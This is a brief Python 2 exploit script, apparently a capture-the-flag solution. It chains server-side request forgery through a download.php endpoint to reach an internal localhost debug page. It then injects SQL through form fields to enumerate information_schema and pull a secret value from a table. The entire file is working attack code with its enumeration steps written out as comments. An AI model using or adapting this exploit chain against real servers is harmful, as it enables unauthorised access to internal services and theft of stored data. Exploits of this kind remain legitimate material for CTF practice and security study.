#!/usr/bin/env python 
import requests
import random
import urllib
 
url = 'http://IP:Port/download.php'
 
#subquery = "database()" 
#subquery = "select table_name from information_schema.tables where table_schema='ssrfw' LIMIT 1" 
#subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1" 
#subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1 OFFSET 1" 
subquery = "select value from cetcYssrf LIMIT 1"
 
dl = '%x'%random.getrandbits(256)

d = ('http://127.0.0.1/secret/secret_debug.php?' +
        urllib.urlencode({
            "s":"3",
            "txtfirst_name":"A','b',("+subquery+"),'c'/*",
            "txtmiddle_name":"B",
            "txtname_suffix":"C",
            "txtLast_name":"D",
            "txtdob":"*/,'E",
            "txtdl_nmbr":dl,
            "txtRetypeDL":dl
            }) +
        "&")

r = requests.get(url, params={"dl":d})
print r.text;
